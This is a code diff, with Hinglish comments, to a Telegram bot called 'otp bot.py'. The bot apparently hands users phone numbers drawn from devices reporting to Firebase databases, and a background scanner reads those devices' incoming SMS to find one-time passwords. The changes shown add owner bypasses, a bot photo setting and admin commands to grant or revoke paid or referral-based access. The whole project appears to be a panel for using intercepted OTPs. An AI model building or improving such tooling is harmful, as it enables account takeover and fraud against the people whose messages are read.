@@ -1,3 +1,4 @@
+# otp bot.py — PART 1/2
 import telebot
 import requests
 import json
@@ -29,7 +30,8 @@ def load_db():
             "users": {}, 
             "firebases": [], 
             "force_join_channels": [], 
-            "active_monitors": {}
+            "active_monitors": {},
+            "bot_photo_url": ""
         }
 
 def save_db(data):
@@ -61,6 +63,9 @@ def format_sms_message(sender, sms_text, time_str):
 # 🛡️ DYNAMIC FORCE JOIN CHECK
 # ==========================================
 def check_force_join(user_id):
+    # assumption: owner ko force join bypass — owner ko kabhi nahi rokna
+    if str(user_id) == str(ADMIN_ID):
+        return True
     channels = db_data.get("force_join_channels", [])
     if not channels:
         return True # Agar admin ne koi channel add nahi kiya, toh direct allow
@@ -151,12 +156,15 @@ def verify_join_handler(call):
 def show_main_menu(chat_id, user_id):
     user_id = str(user_id)
     user = db_data['users'].get(user_id, {})
+    is_owner = (user_id == str(ADMIN_ID))  # fixed: owner ko referral/expiry bypass
     
     # Access Check
     expiry = user.get('expiry', 0)
     current_time = time.time()
     
-    if current_time > expiry:
+    if is_owner:
+        status_text = "👑 <b>ACCESS :</b> Owner (Unlimited)"
+    elif current_time > expiry:
         status_text = "⏳ <b>ACCESS :</b> Expired"
     else:
         remaining = int(expiry - current_time)
@@ -183,13 +191,19 @@ def show_main_menu(chat_id, user_id):
 👇 <b>Tap below to start</b>"""
 
     markup = InlineKeyboardMarkup()
-    if current_time > expiry:
-        markup.add(InlineKeyboardButton("🔗 Share Referral Link", url=f"https://t.me/share/url?url={ref_link}"))
-    else:
+    if is_owner or current_time <= expiry:
         markup.add(InlineKeyboardButton("🎲 GENERATE NUMBER", callback_data="generate_number"))
+    else:
+        markup.add(InlineKeyboardButton("🔗 Share Referral Link", url=f"https://t.me/share/url?url={ref_link}"))
 
-    # Photo ke saath message bhejenge (Tum yahan apni photo ka URL daal sakte ho)
-    # Filhal hum text bhej rahe hain, baad me photo add kar sakte ho
+    # Photo ke saath bhejenge agar admin ne photo set ki hai
+    photo_url = db_data.get("bot_photo_url", "").strip()
+    if photo_url:
+        try:
+            bot.send_photo(chat_id, photo_url, caption=caption, reply_markup=markup, parse_mode='HTML')
+            return
+        except Exception:
+            pass  # photo fail hui toh fallback text
     bot.send_message(chat_id, caption, reply_markup=markup, parse_mode='HTML')
 # ==========================================
 # 🎲 GENERATE NUMBER (FIREBASE SE DEVICE LANA)
@@ -230,10 +244,11 @@ def get_online_devices():
 def generate_number_handler(call):
     user_id = str(call.from_user.id)
     
-    # Expiry Check
-    if time.time() > db_data['users'].get(user_id, {}).get('expiry', 0):
-        bot.answer_callback_query(call.id, "⚠️ Your access has expired. Please refer to get access.", show_alert=True)
-        return
+    # Expiry Check (owner bypass)
+    if user_id != str(ADMIN_ID):
+        if time.time() > db_data['users'].get(user_id, {}).get('expiry', 0):
+            bot.answer_callback_query(call.id, "⚠️ Your access has expired. Please refer to get access.", show_alert=True)
+            return
 
     msg = bot.send_message(call.message.chat.id, "⏳ <i>Scanning online devices from Firebase, please wait...</i>", parse_mode='HTML')
     
@@ -305,7 +320,6 @@ def back_to_main_handler(call):
     
     bot.delete_message(call.message.chat.id, call.message.message_id)
     show_main_menu(call.message.chat.id, call.from_user.id)
-
 
 # ==========================================
 # 🔄 BACKGROUND SCANNER (OTP DHOONDHNA & 10 MIN TIMER)
@@ -403,6 +417,7 @@ def background_scanner():
             print(f"Scanner Error: {e}")
             
         time.sleep(5) # Har 5 second me check karega
+        # otp bot.py — PART 2/2
 # ==========================================
 # 👑 OWNER PANEL (ADMIN UI & COMMANDS)
 # ==========================================
@@ -418,12 +433,14 @@ def admin_panel(message):
     total_users = len(db_data.get('users', {}))
     total_fb = len(db_data.get('firebases', []))
     total_channels = len(db_data.get('force_join_channels', []))
+    has_photo = "✅ Set" if db_data.get('bot_photo_url', '').strip() else "❌ Not Set"
 
     text = f"""👑 <b>OWNER CONTROL PANEL</b>
 〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️
 👥 <b>Total Users:</b> {total_users}
 🗄️ <b>Firebases Connected:</b> {total_fb}
 📢 <b>Force Join Channels:</b> {total_channels}
+🖼️ <b>Bot Photo:</b> {has_photo}
 
 <i>Neeche diye gaye buttons se settings manage karein:</i>"""
 
@@ -435,6 +452,14 @@ def admin_panel(message):
     markup.add(
         InlineKeyboardButton("📢 Add Channel", callback_data="admin_add_channel"),
         InlineKeyboardButton("🔕 Remove Channel", callback_data="admin_remove_channel")
+    )
+    markup.add(
+        InlineKeyboardButton("🖼️ Set Bot Photo", callback_data="admin_set_photo"),
+        InlineKeyboardButton("🗑️ Remove Photo", callback_data="admin_remove_photo")
+    )
+    markup.add(
+        InlineKeyboardButton("⏱️ Give Access", callback_data="admin_give_access"),
+        InlineKeyboardButton("🚫 Revoke Access", callback_data="admin_revoke_access")
     )
     markup.add(
         InlineKeyboardButton("👥 View Users", callback_data="admin_view_users"),
@@ -483,7 +508,34 @@ def admin_callbacks(call):
             markup.add(InlineKeyboardButton(f"❌ Delete: @{ch}", callback_data=f"delch_{i}"))
         bot.edit_message_text("Select Channel to remove:", call.message.chat.id, call.message.message_id, reply_markup=markup)
 
-    # 5. View Users
+    # 5. Set Bot Photo
+    elif action == "admin_set_photo":
+        msg = bot.send_message(call.message.chat.id, 
+            "🖼️ <b>Photo URL bhejein</b> (direct image link, .jpg / .png):\n\n" \
+            "<i>Ya phir seedha photo bhej dein.</i>", parse_mode='HTML')
+        bot.register_next_step_handler(msg, process_set_photo)
+
+    # 6. Remove Bot Photo
+    elif action == "admin_remove_photo":
+        db_data['bot_photo_url'] = ""
+        save_db(db_data)
+        bot.answer_callback_query(call.id, "✅ Photo removed.", show_alert=True)
+        bot.delete_message(call.message.chat.id, call.message.message_id)
+        admin_panel(call.message)
+
+    # 7. Give Access (Owner kisi bhi user ko time de sakta hai)
+    elif action == "admin_give_access":
+        msg = bot.send_message(call.message.chat.id, 
+            "⏱️ <b>User ID bhejein</b> jise access dena hai:\n" \
+            "<i>(User ko /start dabane par ID milegi, ya View Users me dekh sakte ho)</i>", parse_mode='HTML')
+        bot.register_next_step_handler(msg, process_give_access_uid)
+
+    # 8. Revoke Access
+    elif action == "admin_revoke_access":
+        msg = bot.send_message(call.message.chat.id, "🚫 <b>User ID bhejein</b> jiska access hatana hai:", parse_mode='HTML')
+        bot.register_next_step_handler(msg, process_revoke_access_uid)
+
+    # 9. View Users
     elif action == "admin_view_users":
         users = db_data.get('users', {})
         if not users:
@@ -502,12 +554,12 @@ def admin_callbacks(call):
         markup = InlineKeyboardMarkup().add(InlineKeyboardButton("⬅️ Back to Admin", callback_data="admin_main"))
         bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='HTML')
 
-    # 6. Broadcast
+    # 10. Broadcast
     elif action == "admin_broadcast":
         msg = bot.send_message(call.message.chat.id, "📢 <b>Broadcast message likhein:</b>\n(Jo message sabko bhejna hai)", parse_mode='HTML')
         bot.register_next_step_handler(msg, process_broadcast)
 
-    # 7. Back to Main Admin Panel
+    # 11. Back to Main Admin Panel
     elif action == "admin_main":
         bot.delete_message(call.message.chat.id, call.message.message_id)
         admin_panel(call.message) # Re-trigger main menu
@@ -544,6 +596,99 @@ def process_add_channel(message):
             bot.reply_to(message, "⚠️ Ye channel pehle se added hai.")
     except Exception as e:
         bot.reply_to(message, f"❌ Error: Bot is channel me admin nahi hai ya channel galat hai.\nDetail: {e}")
+
+def process_set_photo(message):
+    if message.from_user.id != ADMIN_ID: return
+    
+    # Agar admin ne photo bheji hai (document/photo) toh file_id use karo
+    if message.photo:
+        file_id = message.photo[-1].file_id
+        db_data['bot_photo_url'] = file_id
+        save_db(db_data)
+        bot.reply_to(message, "✅ Bot photo set (uploaded image).")
+        return
+    
+    # Warna URL samjho
+    if message.text:
+        url = message.text.strip()
+        if not (url.startswith("http://") or url.startswith("https://")):
+            bot.reply_to(message, "❌ Invalid URL. http:// ya https:// se shuru hona chahiye.")
+            return
+        db_data['bot_photo_url'] = url
+        save_db(db_data)
+        bot.reply_to(message, "✅ Bot photo URL set.")
+        return
+    
+    bot.reply_to(message, "❌ Photo ya URL bhejein.")
+
+# --- Give / Revoke Access Flow ---
+
+def process_give_access_uid(message):
+    if message.from_user.id != ADMIN_ID: return
+    uid = message.text.strip()
+    
+    if not uid.isdigit():
+        bot.reply_to(message, "❌ User ID sirf numbers me honi chahiye.")
+        return
+    
+    # assumption: owner khud ko bhi override kar sakta hai lekin uski zarurat nahi
+    if uid not in db_data['users']:
+        bot.reply_to(message, "⚠️ Ye user bot me nahi hai. Pehle user ko /start dabana hoga.")
+        return
+    
+    msg = bot.reply_to(message, f"⏱️ <b>Kitne ghante ka access dena hai?</b>\n(Example: <code>24</code> = 24 hours, <code>1</code> = 1 hour)\n\n" \
+        f"<i>Ya <code>0</code> likho toh unlimited/owner-level.</i>", parse_mode='HTML')
+    bot.register_next_step_handler(msg, process_give_access_hours, uid)
+
+def process_give_access_hours(message, uid):
+    if message.from_user.id != ADMIN_ID: return
+    txt = message.text.strip()
+    
+    if not txt.isdigit():
+        bot.reply_to(message, "❌ Sirf number likho (ghante).")
+        return
+    
+    hours = int(txt)
+    
+    if hours == 0:
+        # Unlimited (bahut door ki expiry)
+        new_expiry = time.time() + (365 * 24 * 3600 * 100)
+        bot.reply_to(message, f"✅ User <code>{uid}</code> ko <b>Unlimited access</b> de diya gaya.", parse_mode='HTML')
+    else:
+        new_expiry = time.time() + (hours * 3600)
+        bot.reply_to(message, f"✅ User <code>{uid}</code> ko <b>{hours} hour(s)</b> ka access de diya gaya.", parse_mode='HTML')
+    
+    db_data['users'][uid]['expiry'] = new_expiry
+    save_db(db_data)
+    
+    # User ko notify karo
+    try:
+        bot.send_message(uid, 
+            f"🎉 <b>ACCESS GRANTED!</b>\n\n⏱️ Tumhe <b>{hours if hours else 'Unlimited'}</b> {'hour(s)' if hours else ''} ka access mil gaya hai.\n\n/start dabao aur generate karo!",
+            parse_mode='HTML')
+    except Exception:
+        pass
+
+def process_revoke_access_uid(message):
+    if message.from_user.id != ADMIN_ID: return
+    uid = message.text.strip()
+    
+    if not uid.isdigit():
+        bot.reply_to(message, "❌ User ID sirf numbers me honi chahiye.")
+        return
+    
+    if uid not in db_data['users']:
+        bot.reply_to(message, "⚠️ Ye user bot me nahi hai.")
+        return
+    
+    db_data['users'][uid]['expiry'] = 0
+    save_db(db_data)
+    bot.reply_to(message, f"✅ User <code>{uid}</code> ka access revoke kar diya.", parse_mode='HTML')
+    
+    try:
+        bot.send_message(uid, "⚠️ <b>Access revoked.</b>\n\nNaya access lene ke liye /start dabao.", parse_mode='HTML')
+    except Exception:
+        pass
 
 def process_broadcast(message):
     if message.from_user.id != ADMIN_ID: return
@@ -584,7 +729,6 @@ def remove_item_handler(call):
         
     bot.delete_message(call.message.chat.id, call.message.message_id)
     admin_panel(call.message)
-
 
 # ==========================================
 # 🚀 BOT KO START KARNE KA LOGIC (MUST BE AT LAST)
